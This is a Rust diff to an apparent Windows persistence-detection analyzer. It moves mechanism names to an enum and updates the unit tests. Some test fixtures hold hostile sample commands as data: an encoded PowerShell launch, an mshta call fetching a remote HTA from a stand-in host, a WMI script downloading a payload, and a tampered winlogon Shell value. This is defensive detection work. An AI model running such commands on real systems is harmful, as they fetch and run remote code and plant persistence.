@@ -7,7 +7,7 @@ use crate::trust::{
 };
 use cairn_core::finding::{EntityFile, EntityProcess, EntityRegistry, EvidenceItem};
 use cairn_core::observation::Observation;
-use cairn_core::record::{ExecutionRecord, PersistenceRecord, Record};
+use cairn_core::record::{ExecutionRecord, Mechanism, PersistenceRecord, Record};
 use cairn_core::traits::Analyzer;
 use cairn_core::{Entity, Finding, FindingSource, Result, Severity};
 use chrono::{DateTime, Duration, Utc};
@@ -97,7 +97,7 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
     let path = p.binary_path.as_deref().unwrap_or("");
 
     // S1a: winlogon value tampered (default values are inventory).
-    if p.mechanism == "winlogon" {
+    if p.mechanism == Mechanism::Winlogon {
         let is_default = p
             .value
             .as_deref()
@@ -118,7 +118,7 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
     }
 
     // S1b: IFEO debugger — always gates (rare); severity by target trust.
-    if p.mechanism == "ifeo" {
+    if p.mechanism == Mechanism::Ifeo {
         let untrusted = p.signed == Some(false) || is_user_writable_path(path);
         hits.push(GateHit {
             severity: if untrusted {
@@ -152,7 +152,7 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
     // to the normal S2/S3/S4/S9 checks below rather than an extra unconditional branch
     // here; wmi_subscription must NOT be added to any "exempt from path signals" list,
     // unlike startup, so those checks apply normally to it.)
-    if p.mechanism == "wmi_subscription" && p.binary_path.is_none() {
+    if p.mechanism == Mechanism::WmiSubscription && p.binary_path.is_none() {
         let content = p.command.as_deref().unwrap_or("");
         let lower = content.to_ascii_lowercase();
         let suspicious = content.contains("Chr(")
@@ -191,10 +191,11 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
     // signal (S2/S3/S4) assumes the path is where an attacker CHOSE to hide the binary. For
     // `startup`, Windows already put it in ProgramData/AppData by design, so those same
     // path-trust checks would flag every legitimate startup shortcut (e.g. AnyDesk.lnk).
-    // Mirrors the pre-gate model's `mechanism != "startup"` path-signal exemption.
+    // Mirrors the pre-gate model's `mechanism != Mechanism::Startup` path-signal exemption.
     // Same for PowerShell profiles: the script file IS the persistence location, judged
     // by its content in crate::asep, not by where Windows keeps it.
-    let path_signals_apply = p.mechanism != "startup" && p.mechanism != "ps_profile";
+    let path_signals_apply =
+        p.mechanism != Mechanism::Startup && p.mechanism != Mechanism::PsProfile;
 
     // Extended catalog / accessibility IFEO / PowerShell profile signals.
     if let Some(hit) = crate::asep::asep_signal(p) {
@@ -239,7 +240,7 @@ pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<Ga
                     reason: format!(
                         "created/modified within {RECENT_DAYS} days, signature unverifiable, non-system path: {path}"
                     ),
-                    mitre: crate::asep::mechanism_mitre(&p.mechanism),
+                    mitre: crate::asep::mechanism_mitre(p.mechanism),
                 });
             }
         }
@@ -297,7 +298,7 @@ fn gate_details(p: &PersistenceRecord) -> String {
 /// Evidence for the persistence entry itself.
 fn persistence_evidence(p: &PersistenceRecord) -> EvidenceItem {
     EvidenceItem {
-        artifact: p.mechanism.clone(),
+        artifact: p.mechanism.to_string(),
         path: p.binary_path.clone(),
         ts: p.last_write,
         detail: format!(
@@ -480,10 +481,10 @@ impl Analyzer for PersistHeuristic {
             if !evaluate_gate(p, now).is_empty() {
                 continue; // gated items are findings, not inventory
             }
-            let category = if p.mechanism == "winlogon" {
+            let category = if p.mechanism == Mechanism::Winlogon {
                 "winlogon_default".to_string()
             } else {
-                p.mechanism.clone()
+                p.mechanism.to_string()
             };
             let short = short_name_persist(
                 p.binary_path
@@ -505,7 +506,7 @@ impl Analyzer for PersistHeuristic {
 /// Build the entity: registry-backed mechanisms -> entity.registry; the file-backed
 /// `startup` mechanism -> entity.file (SRS §5.1 mapping in the design spec).
 fn persistence_entity(p: &PersistenceRecord) -> Entity {
-    if p.mechanism == "startup" || p.mechanism == "ps_profile" {
+    if p.mechanism == Mechanism::Startup || p.mechanism == Mechanism::PsProfile {
         Entity {
             file: Some(EntityFile {
                 path: p
@@ -518,7 +519,7 @@ fn persistence_entity(p: &PersistenceRecord) -> Entity {
             }),
             ..Entity::default()
         }
-    } else if p.mechanism == "wmi_subscription" {
+    } else if p.mechanism == Mechanism::WmiSubscription {
         // WMI subscriptions have no registry key or file path of their own — location
         // holds "<filter> -> <consumer>" (see cairn-collectors::wmi_subscription). Reuse
         // entity.registry's key field for this identifier rather than adding a new Entity
@@ -563,12 +564,12 @@ mod tests {
     use super::*;
 
     fn rec(
-        mechanism: &str,
+        mechanism: Mechanism,
         binary_path: Option<&str>,
         last_write: Option<DateTime<Utc>>,
     ) -> PersistenceRecord {
         PersistenceRecord {
-            mechanism: mechanism.into(),
+            mechanism,
             location: "HKLM\\...\\Run".into(),
             value: Some("Updater".into()),
             command: binary_path.map(|p| p.to_string()),
@@ -589,12 +590,12 @@ mod tests {
     fn analyzer_emits_finding_for_malicious_only() {
         let now = Utc::now();
         let bad = Record::Persistence(rec(
-            "ifeo",
+            Mechanism::Ifeo,
             Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"),
             Some(now),
         ));
         let quiet = Record::Persistence(rec(
-            "run_key",
+            Mechanism::RunKey,
             Some(r"C:\Program Files\V\a.exe"),
             Some(now - Duration::days(400)),
         ));
@@ -618,7 +619,7 @@ mod tests {
     fn finding_reason_carries_source_marker_for_cross_analyzer_lookup() {
         let now = Utc::now();
         let bad = Record::Persistence(rec(
-            "ifeo",
+            Mechanism::Ifeo,
             Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"),
             Some(now),
         ));
@@ -641,7 +642,7 @@ mod tests {
     fn s9_execution_hit_populates_entity_process() {
         let now = Utc::now();
         let bad = Record::Persistence(rec(
-            "ifeo",
+            Mechanism::Ifeo,
             Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
             Some(now),
         ));
@@ -684,7 +685,7 @@ mod tests {
     fn startup_mechanism_uses_file_entity() {
         let now = Utc::now();
         let r = PersistenceRecord {
-            mechanism: "startup".into(),
+            mechanism: Mechanism::Startup,
             location: r"C:\Users\a\...\Startup".into(),
             value: Some("Updater".into()),
             command: Some("powershell.exe -NoP -Enc SQBFAFgA".into()),
@@ -705,7 +706,7 @@ mod tests {
 
     // ── gate model (spec §4.2) ───────────────────────────────────────────────
     fn full_rec(
-        mechanism: &str,
+        mechanism: Mechanism,
         value: Option<&str>,
         command: Option<&str>,
         binary_path: Option<&str>,
@@ -713,7 +714,7 @@ mod tests {
         last_write: Option<DateTime<Utc>>,
     ) -> PersistenceRecord {
         PersistenceRecord {
-            mechanism: mechanism.into(),
+            mechanism,
             location: format!("HKLM\\...\\{mechanism}"),
             value: value.map(String::from),
             command: command.map(String::from),
@@ -729,7 +730,7 @@ mod tests {
     fn gate_s1a_winlogon_tamper_high_default_silent() {
         let now = Utc::now();
         let tampered = full_rec(
-            "winlogon",
+            Mechanism::Winlogon,
             Some("Shell"),
             Some("explorer.exe,evil.exe"),
             None,
@@ -741,7 +742,7 @@ mod tests {
         assert_eq!(hits[0].severity, Severity::High);
         assert_eq!(hits[0].mitre, "T1547.004");
         let stock = full_rec(
-            "winlogon",
+            Mechanism::Winlogon,
             Some("Shell"),
             Some("explorer.exe"),
             Some(r"C:\Windows\explorer.exe"),
@@ -758,7 +759,7 @@ mod tests {
     fn gate_s1b_ifeo_severity_by_target_trust() {
         let now = Utc::now();
         let evil = full_rec(
-            "ifeo",
+            Mechanism::Ifeo,
             Some("Debugger"),
             Some(r"C:\Users\a\AppData\Roaming\d.exe"),
             Some(r"C:\Users\a\AppData\Roaming\d.exe"),
@@ -769,7 +770,7 @@ mod tests {
             .iter()
             .any(|h| h.severity == Severity::High));
         let procexp = full_rec(
-            "ifeo",
+            Mechanism::Ifeo,
             Some("Debugger"),
             Some(r"C:\Program Files\SysInternals\procexp.exe"),
             Some(r"C:\Program Files\SysInternals\procexp.exe"),
@@ -789,7 +790,7 @@ mod tests {
     fn gate_s2_unsigned_dropzone_high_but_signed_or_normal_path_silent() {
         let now = Utc::now();
         let evil = full_rec(
-            "run_key",
+            Mechanism::RunKey,
             Some("Upd"),
             Some(r"C:\Users\a\AppData\Roaming\e.exe"),
             Some(r"C:\Users\a\AppData\Roaming\e.exe"),
@@ -799,7 +800,7 @@ mod tests {
         assert_eq!(evaluate_gate(&evil, now)[0].severity, Severity::High);
         // signed chrome autostart -> inventory
         let chrome = full_rec(
-            "run_key",
+            Mechanism::RunKey,
             Some("Chrome"),
             Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
             Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
@@ -809,7 +810,7 @@ mod tests {
         assert!(evaluate_gate(&chrome, now).is_empty());
         // unsigned but in Program Files (admin-write) -> not S2
         let pf = full_rec(
-            "run_key",
+            Mechanism::RunKey,
             Some("V"),
             Some(r"C:\Program Files\V\v.exe"),
             Some(r"C:\Program Files\V\v.exe"),
@@ -827,7 +828,7 @@ mod tests {
     fn gate_startup_mechanism_exempt_from_path_signals() {
         let now = Utc::now();
         let startup_shortcut = full_rec(
-            "startup",
+            Mechanism::Startup,
             None,
             Some(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AnyDesk.lnk"),
             Some(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AnyDesk.lnk"),
@@ -844,7 +845,7 @@ mod tests {
     fn gate_s3_masquerade_absolute_only() {
         let now = Utc::now();
         let fake = full_rec(
-            "service",
+            Mechanism::Service,
             None,
             Some(r"C:\ProgramData\svchost.exe"),
             Some(r"C:\ProgramData\svchost.exe"),
@@ -855,7 +856,7 @@ mod tests {
             .iter()
             .any(|h| h.mitre == "T1036.005"));
         let bare = full_rec(
-            "winlogon",
+            Mechanism::Winlogon,
             Some("Shell"),
             Some("explorer.exe"),
             Some("explorer.exe"),
@@ -871,7 +872,7 @@ mod tests {
         let now = Utc::now();
         let recent = Some(now - Duration::days(2));
         let hit = full_rec(
-            "service",
+            Mechanism::Service,
             None,
             Some(r"C:\Tools\agent.exe"),
             Some(r"C:\Tools\agent.exe"),
@@ -881,7 +882,7 @@ mod tests {
         assert_eq!(evaluate_gate(&hit, now)[0].severity, Severity::Medium);
         // signed -> no S4 (ASUS update-day services)
         let signed = full_rec(
-            "service",
+            Mechanism::Service,
             None,
             Some(r"C:\Tools\agent.exe"),
             Some(r"C:\Tools\agent.exe"),
@@ -891,7 +892,7 @@ mod tests {
         assert!(evaluate_gate(&signed, now).is_empty());
         // system path -> no S4 (per-user svchost instances)
         let sys = full_rec(
-            "service",
+            Mechanism::Service,
             None,
             Some(r"C:\Windows\System32\svchost.exe -k X"),
             Some(r"C:\Windows\System32\svchost.exe"),
@@ -901,7 +902,7 @@ mod tests {
         assert!(evaluate_gate(&sys, now).is_empty());
         // old -> no S4
         let old = full_rec(
-            "service",
+            Mechanism::Service,
             None,
             Some(r"C:\Tools\agent.exe"),
             Some(r"C:\Tools\agent.exe"),
@@ -915,7 +916,7 @@ mod tests {
     fn gate_s9_script_persistence_tiers() {
         let now = Utc::now();
         let enc = full_rec(
-            "run_key",
+            Mechanism::RunKey,
             Some("U"),
             Some("powershell.exe -NoP -Enc SQBFAFgA"),
             None,
@@ -925,7 +926,7 @@ mod tests {
         let h = evaluate_gate(&enc, now);
         assert_eq!(h[0].severity, Severity::High);
         let remote = full_rec(
-            "run_key",
+            Mechanism::RunKey,
             Some("U"),
             Some(r"mshta.exe https://evil.tld/x.hta"),
             None,
@@ -934,7 +935,7 @@ mod tests {
         );
         assert_eq!(evaluate_gate(&remote, now)[0].severity, Severity::High);
         let local = full_rec(
-            "scheduled_task",
+            Mechanism::ScheduledTask,
             None,
             Some(r"wscript.exe C:\Scripts\backup.vbs"),
             Some(r"C:\Windows\System32\wscript.exe"),
@@ -944,7 +945,7 @@ mod tests {
         assert_eq!(evaluate_gate(&local, now)[0].severity, Severity::Low);
         // interpreter-in-vendor-name must NOT fire (substring guard)
         let studio = full_rec(
-            "run_key",
+            Mechanism::RunKey,
             Some("PS"),
             Some(r"C:\Program Files\PowerShell Studio\app.exe --serve"),
             Some(r"C:\Program Files\PowerShell Studio\app.exe"),
@@ -959,7 +960,7 @@ mod tests {
         let now = Utc::now();
         // The 25-Low class from the 2026-06-28 run: plain third-party service.
         let svc = full_rec(
-            "service",
+            Mechanism::Service,
             None,
             Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
             Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
@@ -969,7 +970,7 @@ mod tests {
         assert!(evaluate_gate(&svc, now).is_empty());
         // The 13-Medium class: same service on update day (recent) — still inventory.
         let svc_recent = full_rec(
-            "service",
+            Mechanism::Service,
             None,
             Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
             Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
@@ -990,7 +991,7 @@ mod tests {
         let now = Utc::now();
         let records = vec![
             wrap(full_rec(
-                "run_key",
+                Mechanism::RunKey,
                 Some("Upd"),
                 Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                 Some(r"C:\Users\a\AppData\Roaming\e.exe"),
@@ -998,7 +999,7 @@ mod tests {
                 Some(now),
             )),
             wrap(full_rec(
-                "service",
+                Mechanism::Service,
                 None,
                 Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
                 Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
@@ -1020,7 +1021,7 @@ mod tests {
         let now = Utc::now();
         let records = vec![
             wrap(full_rec(
-                "run_key",
+                Mechanism::RunKey,
                 Some("U"),
                 Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                 Some(r"C:\Users\a\AppData\Roaming\e.exe"),
@@ -1061,7 +1062,7 @@ mod tests {
     fn details_starts_with_full_path_and_title_names_binary() {
         let now = Utc::now();
         let records = vec![wrap(full_rec(
-            "run_key",
+            Mechanism::RunKey,
             Some("U"),
             Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
             Some(r"C:\Users\a\AppData\Roaming\evil.exe"),
@@ -1082,7 +1083,7 @@ mod tests {
     fn winlogon_default_is_observation_with_category() {
         let now = Utc::now();
         let records = vec![wrap(full_rec(
-            "winlogon",
+            Mechanism::Winlogon,
             Some("Shell"),
             Some("explorer.exe"),
             Some(r"C:\Windows\explorer.exe"),
@@ -1100,7 +1101,7 @@ mod tests {
     fn gate_s1c_wmi_active_script_with_suspicious_content_is_high() {
         let now = Utc::now();
         let p = full_rec(
-            "wmi_subscription",
+            Mechanism::WmiSubscription,
             Some("EvilConsumer"),
             Some(r#"CreateObject("Msxml2.XMLHTTP").Open("GET","http://evil.example/payload")"#),
             None,
@@ -1122,7 +1123,7 @@ mod tests {
     fn gate_s1c_wmi_active_script_benign_content_gates_but_not_high() {
         let now = Utc::now();
         let p = full_rec(
-            "wmi_subscription",
+            Mechanism::WmiSubscription,
             Some("BenignConsumer"),
             Some("MsgBox \"hello\""),
             None,
@@ -1146,7 +1147,7 @@ mod tests {
         // the normal S2-S4/S9 path (binary_path is Some), not the unconditional S1c branch.
         let now = Utc::now();
         let p = full_rec(
-            "wmi_subscription",
+            Mechanism::WmiSubscription,
             Some("Consumer"),
             Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
             Some(r"C:\Users\victim\AppData\Local\Temp\evil.exe"),
@@ -1167,7 +1168,7 @@ mod tests {
     #[test]
     fn wmi_subscription_uses_registry_entity_with_wmi_hive_marker() {
         let p = PersistenceRecord {
-            mechanism: "wmi_subscription".into(),
+            mechanism: Mechanism::WmiSubscription,
             location: "Filter -> Consumer".into(),
             value: Some("Consumer".into()),
             command: Some("MsgBox 1".into()),
